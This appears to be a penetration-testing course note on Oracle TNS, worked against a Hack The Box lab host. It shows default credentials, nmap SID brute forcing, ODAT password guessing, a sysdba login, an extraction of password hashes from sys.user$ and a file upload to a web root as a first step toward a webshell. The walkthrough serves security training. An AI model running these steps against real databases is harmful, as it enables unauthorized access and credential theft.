# Oracle TNS (Transport Network Substrate)
- server communication protocol that facilitates communication between Orcale databases and applications over networks
- initially introduced as Oracle Net Services software suite
- supports IPX/SPX and TCP/IP protocol stacks
    
    - preferred solution for managing large, complex databases in healthcare, finance, and retail
    
- has built-in encryption
- TNS has been updated to support IPv6 and SSL/TLS encryption
  
# Default Configuration
- depends on the version, but there are some common attributes
- default on TCP/1521
    
    - can be changed during setup or by changing config file
    
    - support TCP/IP, UDP, IPX/SPX, and AppleTalk
    
- Oracle TNS can be remotely managed in Orcale 8i/9i, but not in Oracle 10g/11g by default
- listener will only accept connections from an authorized host
- performs basic authentication using a combination of hostnames, IPs, usernames, and passwords
- uses Oracle Net Services to encrypt communication
- config stored in tnsnames.ora and listener.ora in /$ORACLE_HOME/network/admin
- Oracle9 has the default password “CHANGE_ON_INSTALL”
- DBSNMP has the default password “dbsnmp”
- many organizations still use the “finger” service along with Oracle, which puts it at risk when we have the knowledge of a home directory
  
## Tnsnames.ora
```JavaScript
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```
- clients can use the service name, in the above case, “orcl” to connect
- tnsnames.ora can also have info on databases, services, authentication details, connection pooling settings, and load balancing configurations
  
## Listener.ora
```JavaScript
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )
LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )
ADR_BASE_LISTENER = C:\oracle
```
- determines what services it should listen to and the behavior of the listener
  
## PL/SQL Exclusion List
- Oracle can be protected by using PL/SQL Exclusion List (PlsqlExclusionList)
    
    - user created text file in $ORACLE_HOME/sqldeveloper
    
|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|
## Setting Up
```JavaScript
sudo apt install odat -y
```
- can also just try typing “odat” and it’ll probably detect
- check if installation was successful with the following command
```JavaScript
./odat.py -h
```
  
## Nmap
```JavaScript
sudo nmap p1521 -sV <IP> --open
```
```JavaScript
Nathan2112@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```
- when a client connects to an Oracle database, it specifies the database’s SID along with the connection string
    
    - if a client does not specify an SID, then the default value stored in tnsnames.ora is used
    
- can use the following tools to enumerate SIDs
    
    - nmap
    
    - hydra
    
    - odat
    
  
```JavaScript
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute
```
```JavaScript
Nathan2112@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```
- gives the SID (in this case, “XE”)
  
## ODAT
```JavaScript
./odat.py all -s <IP>
```
```JavaScript
Nathan2112@htb[/htb]$ ./odat.py all -s 10.129.204.235
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
...SNIP...
[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...
...SNIP...
```
- from this scan, we found credentials scott:tiger, and we can use SQLplus to login
  
once you have a valid SID, you can brute force credentials instead of running all modules
```JavaScript
sudo odat passwordguesser -s <IP> -d <SID>
```
  
### SQLplus
```JavaScript
sqlplus <user>/<pass>@<IP>/<SID>
```
```JavaScript
Nathan2112@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0
Copyright (c) 1982, 2021, Oracle. All rights reserved.
ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
SQL> 
```
  
if you get the following error
```JavaScript
sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
```
execute this
```JavaScript
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
  
### Oracle RDBMS - Interaction
can see the names of tables
```JavaScript
select table_name from all_tables;
```
```JavaScript
SQL> select table_name from all_tables;
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP
...SNIP...
```
  
can see the privileges of the current user
```JavaScript
select * from user_role_privs;
```
```JavaScript
SQL> select * from user_role_privs;
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```
- scott has no administrator privileges, but we can try to connect as the System Database Admin (sysdba)
  
### Oracle RDBMS - Database Enumeration
- try to log in as the database administrator
```JavaScript
sqlplus <user>/<pass>@<IP>/<SID> as sysdba
```
```JavaScript
Nathan2112@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0
Copyright (c) 1982, 2021, Oracle. All rights reserved.

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```
- cannot add any users or make modifications
- can retrieve password hashes from sys.user$ and crack offline
  
### Oracle RDBMS - Extract Password Hashes
```JavaScript
select name, password from sys.user$;
```
```JavaScript
SQL> select name, password from sys.user$;
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE
NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```
  
  
### Oracle RDBMS - File Upload
- can also try to upload a webshell from the target
    
    - this requires the server to be running a web server
    
    - need to know the exact location of the root directory
        
        - can try default paths depending on the type of system
        
    
|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|
  
- can test the file upload with a text file
```JavaScript
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba --putFile <pathto/web/root> testing.txt ./testing.txt
```
```JavaScript
Nathan2112@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
Nathan2112@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```
  
- get the text file with curl
```JavaScript
curl -X GET http://<IP>/testing.txt
```
```JavaScript
Nathan2112@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
Oracle File Upload Test
```